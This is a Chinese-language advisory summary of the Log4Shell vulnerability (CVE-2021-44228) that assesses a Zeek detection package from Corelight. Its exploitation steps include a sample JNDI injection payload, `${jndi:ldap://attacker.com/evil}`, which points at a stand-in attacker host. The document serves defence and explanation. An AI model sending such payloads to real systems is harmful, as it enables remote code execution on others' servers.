## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 至 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 Log4j2，并且允许message lookup substitution，攻击者可以控制log messages or log message parameters

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228 (Log4Shell) 是一个严重的远程代码执行漏洞，存在于 Apache Log4j 2.0-beta9 到 2.15.0 版本中（不包括安全版本 2.12.2、2.12.3 和 2.3.1）。

**有效性：**

根据漏洞库信息和大量公开资料，该漏洞非常有效，可以通过发送特制的字符串到使用 Log4j2 的应用程序，导致远程代码执行。

提供的Zeek包本身并不能直接利用漏洞，而是一种检测工具，用于检测网络流量中是否存在Log4Shell的攻击企图，包括检测HTTP头中的恶意payload，LDAP查询返回的Java文件下载，以及第二阶段Java class文件的下载。

**投毒风险：**

根据提供的POC代码内容进行分析（主要是Zeek脚本和相关说明文档），该仓库的目的是为了检测Log4Shell攻击，而不是提供攻击代码，所以投毒风险很低，为0%。该Zeek包主要通过特征匹配来检测攻击payload和相关的网络行为。

**利用方式：**

1.  攻击者需要找到一个使用 Log4j2 且受影响版本的应用程序。
2.  攻击者需要找到应用程序中会将用户可控数据记录到日志中的地方（例如，HTTP Header，POST 参数等）。
3.  攻击者在这些地方插入恶意的 JNDI 注入字符串，例如 `${jndi:ldap://attacker.com/evil}`。
4.  当 Log4j2 记录包含该字符串的日志时，会触发 JNDI 查询。
5.  Log4j2 会尝试连接到 `attacker.com` 的 LDAP 服务器（或其他 JNDI 服务）。
6.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的 URL。
7.  Log4j2 会下载并执行该 Java 类，从而导致远程代码执行。

**总结：** 该漏洞的利用方式是通过 JNDI 注入，Log4j2 在记录日志时解析恶意字符串，从而导致任意代码执行。提供的Zeek包用于检测此漏洞的利用行为，本身不包含恶意代码。


**项目地址:** [corelight/cve-2021-44228](https://github.com/corelight/cve-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)